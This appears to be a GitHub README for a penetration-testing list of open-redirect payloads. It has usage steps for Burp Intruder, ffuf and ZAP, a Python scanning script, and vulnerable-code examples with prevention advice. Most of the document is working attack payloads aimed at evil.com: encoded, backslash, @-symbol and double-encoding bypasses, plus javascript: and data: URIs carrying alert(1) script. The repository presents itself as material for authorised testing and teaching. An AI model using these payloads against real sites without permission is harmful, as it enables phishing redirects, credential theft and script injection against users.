# Open Redirect Payload List

<div align="center">

![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)
![Payloads](https://img.shields.io/badge/payloads-411-green.svg)
![License](https://img.shields.io/badge/license-MIT-yellow.svg)
![Maintained](https://img.shields.io/badge/maintained-yes-brightgreen.svg)

A comprehensive collection of Open Redirect payloads for penetration testing and bug bounty hunting.

[Features](#features) • [Installation](#installation) • [Usage](#usage) • [Payload Categories](#payload-categories) • [Testing Tools](#testing-tools) • [Contributing](#contributing)

</div>

---

## 📋 Table of Contents

- [About](#about)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Payload Categories](#payload-categories)
- [Testing Tools](#testing-tools)
- [Vulnerability Examples](#vulnerability-examples)
- [Prevention](#prevention)
- [Contributing](#contributing)
- [Disclaimer](#disclaimer)
- [License](#license)

---

## 🔍 About

Open Redirect vulnerabilities occur when a web application accepts user-controllable input that specifies a link to an external site and uses that link in a redirect. This repository contains a curated list of **411 payloads** designed to test for Open Redirect vulnerabilities in web applications.

### What is Open Redirect?

An Open Redirect (also known as URL Redirection) is a security vulnerability that occurs when an application redirects users to a URL specified via an untrusted user-supplied input without proper validation. Attackers can exploit this to redirect victims to malicious websites for phishing, malware distribution, or credential theft.

**CVSS Score:** Typically rated as Low to Medium (3.0 - 6.0)  
**CWE ID:** CWE-601 - URL Redirection to Untrusted Site ('Open Redirect')

---

## ✨ Features

- **411 Unique Payloads** - Comprehensive collection covering various bypass techniques
- **Categorized Payloads** - Organized by technique and encoding methods
- **Burp Suite Compatible** - Ready to use with Burp Suite Intruder
- **Regular Updates** - Continuously updated with new bypass techniques
- **Well Documented** - Detailed explanations and usage examples
- **Bug Bounty Ready** - Proven payloads used in real-world testing
- **Multiple Protocols** - HTTP, HTTPS, JavaScript, Data URI schemes
- **Encoding Variations** - URL encoding, Unicode, double encoding variants

---

## 📦 Installation

### Clone the Repository

```bash
git clone https://github.com/payload-box/open-redirect-payload-list.git
cd open-redirect-payload-list
```

### Download Payloads Only

```bash
wget https://raw.githubusercontent.com/payload-box/open-redirect-payload-list/main/payloads.txt
```

---

## 🚀 Usage

### Burp Suite Intruder

1. Open Burp Suite and capture a request with a potential redirect parameter
2. Send the request to Intruder (Right-click → Send to Intruder)
3. Mark the redirect parameter value as the injection point
4. Go to the "Payloads" tab
5. Click "Load" and select `payloads.txt`
6. Start the attack and analyze responses

**Example Request:**
```http
GET /redirect?url=§PAYLOAD§ HTTP/1.1
Host: victim.com
User-Agent: Mozilla/5.0
```

### Manual Testing

Test individual payloads by substituting them into vulnerable parameters:

```bash
# Test with curl
curl -i "https://victim.com/redirect?url=//evil.com"

# Test with browser
https://victim.com/redirect?url=//evil.com
https://victim.com/redirect?next=https://evil.com
https://victim.com/redirect?returnTo=//evil.com
```

### Automated Testing with FFuf

```bash
ffuf -u "https://victim.com/redirect?url=FUZZ" \
     -w payloads.txt \
     -mc all \
     -fr "Invalid" \
     -o results.json
```

### Testing with OWASP ZAP

1. Configure ZAP as your browser proxy
2. Navigate to the target application
3. Find requests with redirect parameters
4. Right-click → Attack → Fuzz
5. Add the redirect parameter as a fuzz location
6. Select `payloads.txt` as the payload file
7. Start the fuzzer

---

## 📚 Payload Categories

### 1. **Protocol-Based Redirects**
```
//evil.com
https://evil.com
http://evil.com
//evil.com/
///evil.com
```

### 2. **URL Encoding Variations**
```
//evil.com%00
//evil.com%0D%0A
//evil%E3%80%82com
%2F%2Fevil.com
%5C%5Cevil.com
```

### 3. **Backslash Tricks**
```
\/\/evil.com
\/evil.com
\evil.com
/\/\/evil.com
```

### 4. **At Symbol (@) Abuse**
```
//evil.com@victim.com
https://evil.com@victim.com
//victim.com@evil.com
https://victim.com@evil.com
```

### 5. **Hash and Semicolon Bypasses**
```
//evil.com#@victim.com
//evil.com;@victim.com
//evil.com;victim.com
```

### 6. **Parameter Pollution**
```
?url=//evil.com
?redirect=https://evil.com
?next=//evil.com
?return=https://evil.com
?returnTo=//evil.com
```

### 7. **JavaScript & Data URIs**
```
javascript:alert(1)
javascript://evil.com%0Aalert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 8. **Unicode and Alternative Characters**
```
//evil。com
//evil%E3%80%82com
//evil%u3002com
```

### 9. **IP Address Variants**
```
//127.0.0.1
//0x7f.0x0.0x0.0x1
//localhost
//[::1]
```

### 10. **Double Encoding**
```
/%252fevil.com
/%255cevil.com
//%252fevil.com
```

---

## 🛠️ Testing Tools

### Recommended Tools

- **[Burp Suite](https://portswigger.net/burp)** - Web application security testing
- **[OWASP ZAP](https://www.zaproxy.org/)** - Open-source web app scanner
- **[FFuf](https://github.com/ffuf/ffuf)** - Fast web fuzzer
- **[Nuclei](https://github.com/projectdiscovery/nuclei)** - Vulnerability scanner
- **[curl](https://curl.se/)** - Command-line HTTP client
- **[httpx](https://github.com/projectdiscovery/httpx)** - Fast HTTP toolkit

### Custom Testing Script

```python
import requests

def test_open_redirect(base_url, param, payload):
    url = f"{base_url}?{param}={payload}"
    try:
        response = requests.get(url, allow_redirects=False, timeout=5)
        if response.status_code in [301, 302, 303, 307, 308]:
            location = response.headers.get('Location', '')
            if 'evil.com' in location or payload in location:
                print(f"[VULNERABLE] {url}")
                print(f"[REDIRECT TO] {location}")
                return True
    except Exception as e:
        print(f"[ERROR] {url}: {e}")
    return False

# Usage
with open('payloads.txt', 'r') as f:
    payloads = f.read().splitlines()

for payload in payloads:
    test_open_redirect('https://victim.com/redirect', 'url', payload)
```

---

## 💡 Vulnerability Examples

### Example 1: Basic Open Redirect

**Vulnerable Code (PHP):**
```php
<?php
$redirect_url = $_GET['url'];
header("Location: " . $redirect_url);
exit();
?>
```

**Exploit:**
```
https://victim.com/redirect.php?url=//evil.com
```

### Example 2: Whitelisted Domain Bypass

**Vulnerable Code (Python):**
```python
redirect_url = request.args.get('next')
if 'victim.com' in redirect_url:
    return redirect(redirect_url)
```

**Exploit:**
```
https://victim.com/redirect?next=https://victim.com.evil.com
https://victim.com/redirect?next=https://victim.com@evil.com
```

### Example 3: OAuth Redirect URI

**Vulnerable Flow:**
```
https://victim.com/oauth/authorize?redirect_uri=//evil.com&client_id=123
```

---

## 🛡️ Prevention

### Best Practices

1. **Use Whitelisting**
```python
ALLOWED_DOMAINS = ['victim.com', 'trusted.com']

def safe_redirect(url):
    parsed = urlparse(url)
    if parsed.netloc in ALLOWED_DOMAINS:
        return redirect(url)
    return abort(400)
```

2. **Validate Against Relative URLs Only**
```javascript
function safeRedirect(url) {
    if (url.startsWith('/') && !url.startsWith('//')) {
        window.location = url;
    }
}
```

3. **Use Indirect Object References**
```php
$allowed_redirects = [
    'home' => '/dashboard',
    'profile' => '/user/profile',
    'logout' => '/auth/logout'
];

$redirect_key = $_GET['redirect'];
if (isset($allowed_redirects[$redirect_key])) {
    header("Location: " . $allowed_redirects[$redirect_key]);
}
```

4. **Implement Proper URL Parsing**
```java
URL url = new URL(redirectUrl);
String host = url.getHost();
if (!host.endsWith(".victim.com")) {
    throw new SecurityException("Invalid redirect");
}
```

### Security Headers

Add security headers to mitigate redirect-based attacks:

```http
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'
Referrer-Policy: no-referrer
```

---

## 🤝 Contributing

Contributions are welcome! Here's how you can help:

### Adding New Payloads

1. Fork this repository
2. Add your payloads to `payloads.txt`
3. Ensure payloads are unique and well-tested
4. Submit a pull request with a clear description

### Reporting Issues

- Use the [Issues](https://github.com/payload-box/open-redirect-payload-list/issues) page
- Provide detailed information about the payload or issue
- Include examples and proof of concept if possible

### Guidelines

- One payload per line
- No duplicate entries
- Test payloads before submission
- Include comments for complex payloads if needed
- Follow the existing format and structure

---

## ⚠️ Disclaimer

**IMPORTANT:** This tool is provided for educational and ethical testing purposes only.

- Only test applications you have explicit permission to test
- Unauthorized testing may violate laws (e.g., CFAA, Computer Misuse Act)
- The authors are not responsible for misuse or damage caused by this tool
- Always follow responsible disclosure practices
- Respect bug bounty program rules and scope
- Use for legitimate security research and authorized penetration testing only

**By using this repository, you agree to use it responsibly and ethically.**

---

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## 🌟 Acknowledgments

- Security researchers and bug bounty hunters community
- OWASP Foundation for security resources
- PortSwigger for Burp Suite documentation
- All contributors to this project

---

## 📞 Contact

- **GitHub Issues:** [Report a bug or request a feature](https://github.com/payload-box/open-redirect-payload-list/issues)
- **Pull Requests:** [Contribute to the project](https://github.com/payload-box/open-redirect-payload-list/pulls)

---

## 📊 Statistics

- **Total Payloads:** 411
- **Categories:** 10+
- **Last Updated:** 2024
- **Maintained:** Yes

---

<div align="center">

### ⭐ Star this repository if you find it useful!

**Made with ❤️ by the security community**

[Report Bug](https://github.com/payload-box/open-redirect-payload-list/issues) • [Request Feature](https://github.com/payload-box/open-redirect-payload-list/issues) • [Contribute](https://github.com/payload-box/open-redirect-payload-list/pulls)

</div>